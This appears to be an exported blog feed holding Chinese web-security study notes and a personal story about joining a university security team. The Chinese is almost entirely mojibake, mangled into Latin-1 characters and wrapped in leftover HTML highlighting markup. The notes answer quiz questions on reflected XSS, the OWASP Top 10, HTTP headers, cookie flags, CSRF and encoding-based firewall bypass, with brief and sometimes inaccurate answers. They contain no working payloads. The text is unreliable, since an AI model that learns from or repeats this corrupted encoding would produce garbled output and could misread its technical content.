ä¸­ï¼Œå“ªäº›éƒ¨åˆ†å±äºå®¢æˆ·ç«¯çš„å†…å®¹ï¼Œå“ªäº›å±äºæœåŠ¡ç«¯çš„å†…å®¹ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>æœåŠ¡ç«¯ï¼šå‰é¢éƒ¨åˆ† å®¢æˆ·ç«¯ï¼šåé¢éƒ¨åˆ†<br>    <br>å®¢æˆ·ç«¯æ˜¯é€šè¿‡ä¼ é€’ä»€ä¹ˆå‚æ•°æ¥æ§åˆ¶æœåŠ¡ç«¯ä»£ç çš„ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>get<br><br>å®¢æˆ·ç«¯é€šè¿‡æ§åˆ¶è¯¥å‚æ•°ä¼šå¯¹æœåŠ¡ç«¯é€ æˆä»€ä¹ˆå½±å“ï¼Œç»§è€Œä½¿å¾—å®¢æˆ·ç«¯æœ¬èº«æ”¶åˆ°å½±å“ï¼Œä»è€Œé€ æˆäº†ä»€ä¹ˆæ¼æ´ï¼Ÿå¦‚æœæ˜¯xssæ¼æ´ï¼Œå…·ä½“åˆæ˜¯ä»€ä¹ˆç±»å‹çš„xssæ¼æ´ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼ˆ3åˆ†ï¼‰<br>xssï¼Œåå°„ã€‚åå°„ç›´æ¥åœ¨ç½‘é¡µä¸­å›æ˜¾ã€‚<br>    <br>æ€è€ƒï¼šç°å®ä¸­å¦‚ä½•åˆ©ç”¨xssæ¼æ´å®æ–½æ”»å‡»ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•é¢„é˜²ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>ç›—å–cookieã€‚<br>é¢„é˜²ï¼š1ã€è¿‡æ»¤å‚æ•°ï¼ˆä½†æ˜¯æ— æ³•å®Œå…¨å®ç°ï¼‰ï¼Œæ¯”å¦‚URLå’Œå‚æ•°è¿›è¡Œå„ç§çš„ç¼–ç ï¼Œæ¯”å¦‚escape, encodeURI, encodeURIComponent, 16è¿›åˆ¶ï¼Œ10è¿›åˆ¶ï¼Œ8è¿›åˆ¶ï¼Œæ¥ç»•è¿‡XSSè¿‡æ»¤ã€‚<br>    2ã€é»‘ç™½åå•ç»“åˆ<br></code></pre></td></tr></table></figure><h2 id="åˆå­¦-è§†é¢‘2"><a href="#åˆå­¦-è§†é¢‘2" class="headerlink" title="åˆå­¦-è§†é¢‘2"></a>åˆå­¦-è§†é¢‘2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰<br>æ³¨å…¥ã€å¤±æ•ˆèº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†ã€è·¨ç«™è„šæœ¬XSSã€å¤±æ•ˆçš„è®¿é—®æ§åˆ¶ã€å®‰å…¨é…ç½®é”™è¯¯ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€è·¨ç«™è¯·æ±‚ä¼ªé€ CSRFã€ä½¿ç”¨å«æœ‰æ¼æ´çš„æ§ä»¶ã€æ”»å‡»æ£€æµ‹å’Œé˜²èŒƒä¸è¶³ã€æœªå—ä¿æŠ¤çš„ APIsã€ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§<br><br>è‚¯å®šæ˜¯å¸¸è§ï¼Œå› ä¸ºæ¯ä¸ªæ¼æ´éƒ½å¾ˆå¸¸è§ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/owasp-top-10.jpg.imgw.850.x.jpg" alt="owasp-top-10.jpg.imgw.850.x"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†<br><br>è¯ä¹¦å¡«å……<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3.</span>ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•<span class="hljs-comment">(insufficient logging)</span>ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ<span class="hljs-number">2</span>åˆ†ï¼‰<br><br>æ”»å‡»è€…ä¾é ç›‘æ§çš„ä¸è¶³å’Œå“åº”çš„ä¸åŠæ—¶æ¥è¾¾æˆä»–ä»¬çš„ç›®æ ‡è€Œä¸è¢«çŸ¥æ™“ã€‚æ¯”å¦‚æ—¥å¿—æ²¡æœ‰è®°å½•ç™»å½•å¤±è´¥ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½å°±å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£å¤šæ¬¡è¿›è¡Œç™»å½•å°è¯•ï¼Œä½†æ˜¯æ—¥å¿—ä¸­å´æ²¡æœ‰è®°å½•ã€‚è¿™å°±å¯èƒ½è®©æ”»å‡»è€…æˆåŠŸå…¥ä¾µç³»ç»Ÿå¹¶éšåŒ¿è‡ªå·±çš„è¡Œè¸ªã€‚è¿™ä¸ªçœ‹ä¼¼å±å®³ä¸å¤§ä½†å´æ˜¯ååˆ†ä¸¥é‡çš„å±å®³ï¼Œå› ä¸ºä¸€ä¸ªæ—¥å¿—ç³»ç»Ÿä¸å®Œå–„çš„æœåŠ¡å™¨å¾ˆå®¹æ˜“é­å—æ”»å‡»å¹¶ä¸”åœ¨é­å—æ”»å‡»åæ— æ³•åˆ¤æ–­æ”»å‡»æ¥æºï¼Œè¿™æ ·å°±æ— æ³•åšå‡ºç›¸åº”çš„é˜²å¾¡ï¼Œå¾ˆå¯èƒ½å†æ¬¡é­å—åŒæ ·çš„æ”»å‡»ã€‚<br><br>åªè¦æ˜¯æ¼æ´éƒ½ä¸¥é‡ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.è¯·ç¿»é˜…ä¸€ä¸‹owasp testing guideï¼Œä»¥åŠowasp testing guide check-listï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ<span class="hljs-number">3</span>åˆ†ï¼‰<br><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">5.</span>you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> you notes<br>   you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> things you can refer <span class="hljs-keyword">to</span><br>ç»“åˆè¿™ä¸¤å¥è¯è°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ<span class="hljs-number">2</span>åˆ†ï¼‰<br><br>æˆ‘æ­£åœ¨åšçš„äº‹æƒ…ã€‚<br></code></pre></td></tr></table></figure><h2 id="åˆå­¦-è§†é¢‘3"><a href="#åˆå­¦-è§†é¢‘3" class="headerlink" title="åˆå­¦-è§†é¢‘3"></a>åˆå­¦-è§†é¢‘3</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-number">1</span>.httpæŠ¥æ–‡çš„ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ<span class="hljs-number">1</span>åˆ†ï¼‰<br><br><span class="hljs-number">1</span>ã€æ–¹å¼(<span class="hljs-keyword">method</span>)ï¼šå®¢æˆ·ç«¯å¸Œæœ›æœåŠ¡å™¨å¯¹èµ„æºæ‰§è¡Œçš„åŠ¨ä½œï¼Œæ˜¯ä¸€ä¸ªå•ç‹¬çš„è¯ï¼Œæ¯”å¦‚ï¼Œ<span class="hljs-title function_">GET</span>ã€<span class="hljs-title function_">POST</span>æˆ–<span class="hljs-title function_">HEAD</span><br><br>2ã€è¯·æ±‚<span class="hljs-title function_">URL</span><span class="hljs-params">(request-URL)</span>ï¼šè¦ç›´æ¥ä¸æœåŠ¡å™¨è¿›è¡Œå¯¹è¯ï¼Œåªè¦è¯·æ±‚<span class="hljs-title function_">URL</span>æ˜¯èµ„æºçš„ç»å¯¹è·¯å¾„å°±å¯ä»¥äº†ï¼ŒæœåŠ¡å™¨å¯ä»¥å‡å®šè‡ªå·±æ˜¯<span class="hljs-title function_">URL</span>çš„ä¸»æœº/ç«¯å£<br><br>3ã€ç‰ˆæœ¬<span class="hljs-params">(version)</span>ï¼šæŠ¥æ–‡æ‰€ä½¿ç”¨çš„<span class="hljs-title function_">HTTP</span>ç‰ˆæœ¬ã€‚å…¶æ ¼å¼ï¼š<span class="hljs-title function_">HTTP</span>/&lt;ä¸»è¦ç‰ˆæœ¬å·&gt;.&lt;æ¬¡è¦ç‰ˆæœ¬å·&gt;<br><br>4ã€çŠ¶æ€ç <span class="hljs-params">(status-code)</span>ï¼šçŠ¶æ€ç æ˜¯ä¸‰ä½æ•°å­—ï¼Œæè¿°äº†è¯·æ±‚è¿‡ç¨‹ä¸­æ‰€å‘ç”Ÿçš„æƒ…å†µã€‚æ¯ä¸ªçŠ¶æ€ç çš„ç¬¬ä¸€ä½æ•°å­—éƒ½ç”¨äºæè¿°çŠ¶æ€çš„ä¸€èˆ¬ç±»åˆ«<span class="hljs-params">(æ¯”å¦‚ï¼Œâ€œæˆåŠŸâ€ã€â€œå‡ºé”™â€ç­‰ç­‰)</span><br><br>5ã€åŸå› çŸ­è¯­<span class="hljs-params">(reason-phrase)</span>ï¼šæ•°å­—çŠ¶æ€ç çš„å¯è¯»ç‰ˆæœ¬ï¼ŒåŒ…å«è¡Œç»ˆæ­¢åºåˆ—ä¹‹å‰çš„æ‰€æœ‰æ–‡æœ¬ã€‚åŸå› çŸ­è¯­åªå¯¹äººç±»æœ‰æ„ä¹‰ï¼Œå› æ­¤ï¼Œå°½ç®¡å“åº”è¡Œ<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">NOT</span> <span class="hljs-title function_">OK</span>å’Œ<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">OK</span>ä¸­åŸå› çŸ­è¯­çš„å«ä¹‰ä¸åŒï¼Œä½†åŒæ ·éƒ½ä¼šè¢«å½“ä½œæˆåŠŸæŒ‡ç¤ºå¤„ç†<br><br>6ã€å¤´éƒ¨<span class="hljs-params">(header)</span>ï¼šå¯ä»¥æœ‰é›¶ä¸ªæˆ–å¤šä¸ªå¤´éƒ¨ï¼Œæ¯ä¸ªé¦–éƒ¨éƒ½åŒ…å«ä¸€ä¸ªåå­—ï¼Œåé¢è·Ÿç€ä¸€ä¸ªå†’å·<span class="hljs-params">(:)</span>ï¼Œç„¶åæ˜¯ä¸€ä¸ªå¯é€‰çš„ç©ºæ ¼ï¼Œæ¥ç€æ˜¯ä¸€ä¸ªå€¼ï¼Œæœ€åæ˜¯ä¸€ä¸ª<span class="hljs-title function_">CRLF</span>é¦–éƒ¨æ˜¯ç”±ä¸€ä¸ªç©ºè¡Œ<span class="hljs-params">(CRLF)</span>ç»“æŸçš„ï¼Œè¡¨ç¤ºäº†å¤´éƒ¨åˆ—è¡¨çš„ç»“æŸå’Œå®ä½“ä¸»ä½“éƒ¨åˆ†çš„å¼€å§‹<br><br>7ã€å®ä½“çš„ä¸»ä½“éƒ¨åˆ†<span class="hljs-params">(entity-body)</span>ï¼šå®ä½“çš„ä¸»ä½“éƒ¨åˆ†åŒ…å«ä¸€ä¸ªç”±ä»»æ„æ•°æ®ç»„æˆçš„æ•°æ®å—ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æŠ¥æ–‡éƒ½åŒ…å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ï¼Œæœ‰æ—¶ï¼ŒæŠ¥æ–‡åªæ˜¯ä»¥ä¸€ä¸ª<span class="hljs-title function_">CRLF</span>ç»“æŸã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217225853.png" alt="QQæˆªå›¾20220217225853"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">2.</span>ä»€ä¹ˆæ˜¯<span class="hljs-literal">crlf</span>ï¼Ÿåœ¨<span class="hljs-keyword">http</span>æŠ¥æ–‡çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆ<span class="hljs-number">1</span>åˆ†ï¼‰<br>å·²ç­”ã€‚å›è½¦æ¢è¡Œï¼Œæ¯è¡Œæœ«ä½ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.è§£é‡Šä¸‹è¿™å‡ ä¸ªå¤´çš„å«ä¹‰ï¼ˆ<span class="hljs-number">5</span>åˆ†ï¼‰<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217230327.png" alt="QQæˆªå›¾20220217230327"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">4</span>ã€cookieå…·æœ‰å“ªäº›ç‰¹ç‚¹ï¼Œä¸åŒçš„åŸŸåå’Œå­åŸŸåå¯¹cookieæœ‰æ€æ ·çš„æƒé™ï¼ŸCookieçš„Secureå’Œ HTTPOnlyè¿™ä¸¤ä¸ªflagåˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿè¯·ç»“åˆxssæ”»å‡»æ¥è¿›è¡Œè¯´æ˜ï¼ˆ<span class="hljs-number">3</span>åˆ†ï¼‰<br><br>ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¸´æ—¶å­˜åœ¨ã€‚ä¸ºåŸŸåè®¾ç½®çš„cookieï¼Œå­åŸŸåä¹Ÿå¯è¯»ã€‚å­åŸŸååªå¯å†™è‡ªèº«çš„cookieã€‚<br><br><span class="hljs-symbol">Secure:</span>é™åˆ¶åªæœ‰é€šè¿‡httpsè®¿é—®æ—¶æ‰èƒ½ä¼ é€’cookie<br><br><span class="hljs-symbol">httponly:</span>é˜»æ­¢JavaScriptè¯»å–cookieï¼Œå¯é˜²xssæ”»å‡»<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">5.ç®€è¿°æœ¬è§†é¢‘æåˆ°çš„xssç»•è¿‡webé˜²ç«å¢™çš„æ–¹æ¡ˆï¼ˆ5åˆ†ï¼‰<br>ç”¨UTF<span class="hljs-string">-7</span>/UTF<span class="hljs-string">-32</span>ç¼–ç payload<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">6.å†…å®¹å—…æ¢æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªäº›ç±»å‹ï¼Ÿè¯·åˆ†åˆ«ä¸¾ä¾‹ï¼Œä¸»è¦ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼Ÿã€‚ä¸ºä»€ä¹ˆfacebookç­‰ç½‘ç«™éœ€è¦ä½¿ç”¨ä¸åŒçš„åŸŸåæ¥å­˜å‚¨å›¾ç‰‡ï¼Ÿï¼ˆ5åˆ†ï¼‰<br>é€šè¿‡è§£ææ–‡ä»¶çš„å†…å®¹ï¼Œæ¥çŒœæµ‹MIMEç±»å‹çš„æ ¼å¼ã€‚æœ‰æµè§ˆå™¨å—…æ¢å’Œå®¢æˆ·ç«¯å—…æ¢ã€‚å®¢æˆ·ç«¯å—…æ¢å¯ç”¨æ¥åˆ¤æ–­æµè§ˆå™¨ä¸ºä»€ä¹ˆæµè§ˆå™¨ã€‚<br><br>æœ‰äº›MIMEç±»å‹æ˜¯å¯æ‰§è¡Œç±»å‹ï¼Œå¯ä»¥é€šè¿‡æ··æ·†MIMEå—…æ¢ç®—æ³•æ¥æ‰§è¡ŒXSSã€‚<br><br>é˜²æ­¢å†…å®¹å—…æ¢ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">7.åŒæºç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿé™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿæµè§ˆå™¨åœ¨é‡åˆ°å“ªä¸¤ç§æƒ…å†µçš„æ—¶å€™ä¼šç”¨åˆ°åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•æ”¾æ¾SOPé™åˆ¶ï¼Ÿæ”¾æ¾SOPé™åˆ¶ä¼šå¯¹æµè§ˆå™¨æ’ä»¶å®‰å…¨é€ æˆæ€æ ·çš„ç ´åï¼Ÿ<br><br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">8.</span>csrfæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è®¾è®¡è§„é¿csrfï¼Ÿè§†é¢‘ä¸­æåˆ°çš„é”™è¯¯çš„csrfé…ç½®æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ<br>è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚<br><br>éªŒè¯<span class="hljs-built_in">token</span>ï¼ŒéªŒè¯HTTPè¯·æ±‚çš„Refererï¼Œè¿˜æœ‰éªŒè¯XHRé‡Œçš„è‡ªå®šä¹‰<span class="hljs-built_in">header</span>ã€‚<br><br>æ²¡æœ‰å¯¹è¯·æ±‚æ¥æºè¿›è¡ŒéªŒè¯/è¿‡æ»¤<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é™„åŠ é¢˜ï¼š5ã€6ä¸¤ç‚¹ä¸»è¦åˆ©ç”¨çš„æ˜¯ç”±äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å¯¹åŒä¸€ä¿¡æ¯çš„å¤„ç†æ–¹å¼ä¸åŒé€ æˆçš„æ¼æ´ï¼Œä½ è¿˜èƒ½ä¸¾å‡ºç›¸ä¼¼çš„ä¾‹å­ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰<br>SSTI<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿›å…¥é“æ ¼çš„é‚£äº›äº‹</title>
    <link href="/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹"><a href="#è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹" class="headerlink" title="è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹"></a>è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹</h1><p>ç”±äºæ¢äº†ç”µè„‘ï¼Œæ¯æ¬¡ç»™ä¸­å“¥äº¤æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸­å“¥éƒ½ä¼šè¯´åšä¸ªå›¾åºŠå§ã€‚å®³ï¼Œä¹‹å‰çš„æˆªå›¾ä¸è§äº†ï¼ˆè‡ªå·±åˆå»æˆªå›¾äº†ä¸‹ï¼‰ã€‚</p><p>æœ‰ä¸€è¯´ä¸€æ„Ÿè§‰è¿›é“æ ¼æœ‰ä¸ªæ‰‹å°±è¡Œï¼ˆå¯èƒ½ç¥ç»æœ‰ç‚¹ä¸æ­£å¸¸emmmm~~ï¼‰ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°è¿™ä¸€è·¯è¿‡æ¥è¿™ä¹ˆåå·ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡é¢è¯•"><a href="#ç¬¬ä¸€æ¬¡é¢è¯•" class="headerlink" title="ç¬¬ä¸€æ¬¡é¢è¯•"></a>ç¬¬ä¸€æ¬¡é¢è¯•</h2><p>åœ¨ç¬¬ä¸€æ¬¡é¢è¯•ä¹‹å‰ï¼Œå·²ç»æ°´äº†ä¸€ä¸ªå­¦æœŸäº†ã€‚æˆ‘ä¸€ç›´è§‰å¾—æˆ‘è·Ÿå¤§äºŒçš„å­¦ç”Ÿä¸€ä¸ªæ°´å¹³ï¼ˆèœœæ±è‡ªä¿¡ï¼‰ï¼Œåæ¥å‘ç°å¤§äºŒçš„å­¦ç”Ÿéƒ½æ˜¯å¯ä»¥è‡ªä¸»åˆ†æpopé“¾äº†ï¼Œè€Œæˆ‘è¿˜æ²‰è¿·åœ¨åŸºæœ¬æ¼æ´ã€‚ç„¶åç¬¬ä¸€æ¬¡é¢è¯•ï¼Œåœ¨å¼€å­¦çš„é‚£å‡ å¤©ï¼Œç„¶åç¬¬ä¸€æ¬¡é‡è§ä¸­å“¥ï¼Œè¿›è¡Œäº†å¼€å¼€å¿ƒå¿ƒçš„é¢è¯•ï¼ˆä¸­å“¥å¤ªå‹å¥½äº†ï¼Œè·Ÿä»–çš„æ­£ç»ä¸åŒ¹é…ï¼‰ã€‚å½“ç„¶è¿™ç¬¬ä¸€æ¬¡ä¹Ÿæ²¡æœ‰æ­£å¼è¿›å…¥é“æ ¼ã€‚ä½†æ˜¯è¢«å¤¸äº†åŸºç¡€å¥½ï¼Œä¸çŸ¥é“æ˜¯é¼“åŠ±çš„è¯è¿˜æ˜¯ä»€ä¹ˆè¯ã€‚ç„¶åå­¦å­¦javaï¼Œç„¶åå°±æ­¥å…¥äº†æ¼«é•¿çš„å­¦ä¹ ã€‚ä¸­å“¥å¯¹ç†Šæµ·çš„è¯„ä»·ï¼Œåé¢æƒ³äº†ä¸€æ™šä¸Šï¼Œç¬¬äºŒå¤©è·Ÿä¸­å“¥æ·±æ·±çš„äº¤æµäº†ä¸€ä¸‹ã€‚åšå¥½å†³å®šè®¤çœŸå­¦ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A53.png" alt="ä¸­å“¥3"></p><h2 id="ç¬¬äºŒæ¬¡é¢è¯•"><a href="#ç¬¬äºŒæ¬¡é¢è¯•" class="headerlink" title="ç¬¬äºŒæ¬¡é¢è¯•"></a>ç¬¬äºŒæ¬¡é¢è¯•</h2><p>ç»ˆäºç»å†äº†1ä¸ªåŠæœˆçš„å­¦ä¹ javaï¼Œå†ä¸€æ¬¡æ¥é¢è¯•ã€‚æˆ‘ä¿¡å¿ƒåè¶³ï¼Œä¹Ÿè®¸æˆ‘æ‰20å²ï¼Œå¯¹ä»»ä½•äº‹éƒ½æ˜¯å……æ»¡äº†ä¿¡å¿ƒã€‚æˆ‘å†ä¸€æ¬¡è§‰å¾—æˆ‘è‚¯å®šèƒ½è¿›é“æ ¼äº†ã€‚é¢è¯•ä¹Ÿä¸é”™ï¼Œä¸­å“¥ä¹Ÿè¯´æˆ‘è¿›åº¦è·Ÿçš„ä¸é”™ï¼Œä½†æ˜¯ä»–å°½ç„¶è®©æˆ‘è‡ªæˆ‘ä»‹ç»ä¸€ä¸‹ï¼ï¼ï¼ï¼ï¼ˆå¿…é¡»åæ§½ä¸€ä¸‹ï¼‰äººéƒ½ç»™æˆ‘æ•´å‚»äº†ã€‚ç»“æŸçš„æ—¶å€™ä»–è¯´ï¼Œè¦å›¢é˜Ÿå•†é‡ä¸‹ã€‚å®³~~ï¼Œæˆ‘è¿™è‡ªä¿¡å†ä¸€æ¬¡è¢«æ‰“å‡»ã€‚ä¸è¿‡è¿™æ¬¡çš„æ‰“å‡»è·Ÿä¸Šä¸€æ¬¡ä¸åŒï¼Œæˆ‘æ„Ÿè§‰åœ¨é€—æˆ‘ç©å‘¢ã€‚ä½†æ˜¯æ²¡åŠæ³•ç¡®å®å®åŠ›ä¸è¶³ï¼Œä¹Ÿè®¸æˆ‘ä¼šçš„è·Ÿå¤§äºŒçš„ä¸€æ ·å¤šï¼Œpopé“¾æˆ‘ä¹Ÿå¯ä»¥ä¿¡æ‰‹æ²¾æ¥ï¼Œä¸­å“¥å°±ä¸ä¼šä¸€è€Œå†çš„çŠ¹è±«~ï¼Œä¸è¿‡ä»–ä¸€å¦‚æ—¢å¾€çš„å¥½ï¼Œè®©æˆ‘å½“äº†ä¸ªé“æ ¼å®ä¹ æˆå‘˜ã€‚ï¼ˆæˆ‘æ€€ç–‘è¿™æ˜¯å²æ— å‰ä¾‹çš„ï¼‰ï¼Œç„¶åè¿›å…¥æœ€ç»ˆè€ƒæ ¸ï¼ŒæŒ–æ´ï¼æˆ‘ä»¥å‰æƒ³éƒ½ä¸æ•¢æƒ³ã€‚è®°å¾—ç¬¬ä¸€æ¬¡é¢è¯•ä¹‹å‰ï¼Œä¸­å“¥è®©æˆ‘å®¡è®¡ç†Šæµ·cmsæˆ‘å½“æ—¶å€™ï¼Œçœ‹åˆ°é‚£ä¹ˆå¤šçš„ä»£ç ï¼ŒçœŸçš„æ˜¯å‚»ä¹ä¹ï¼Œæ— ä»ä¸‹æ‰‹ã€‚å¿˜è®°è¯´äº†ï¼æ˜¯é‚£ä¸ªé“æ ¼ç®¡ç†å‘˜è¯´ä»–å«é™ˆå˜‰è‰ï¼ï¼ï¼æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯ä¸ªå­¦å§ï¼Œè¿˜æ˜¯ä¸ªæ¸©æŸ”çš„å­¦å§ï¼ï¼åæ¥æ‰çŸ¥é“æ˜¯ä¸ªç”·ç”Ÿï¼</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A52.png" alt="ä¸­å“¥2"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A5.png" alt="ä¸­å“¥"></p><h2 id="ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—"><a href="#ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—" class="headerlink" title="ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—"></a>ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—</h2><p>å‰å‰ååä¸€ä¸ªåŠæœˆå§ã€‚ç»™æˆ‘çš„æœ€å¤§æ„Ÿå—å°±æ˜¯ï¼Œå­¦ä¹ ä¿¡å®‰çš„è¿™æ¡è·¯ä¸Šè¦å°‘èµ°å¼¯è·¯ï¼Œä½†æ˜¯ä¸è¦æ€•èµ°å¼¯è·¯ï¼ŒäºŒè€…éƒ½å¯ä»¥ç»™ä½ 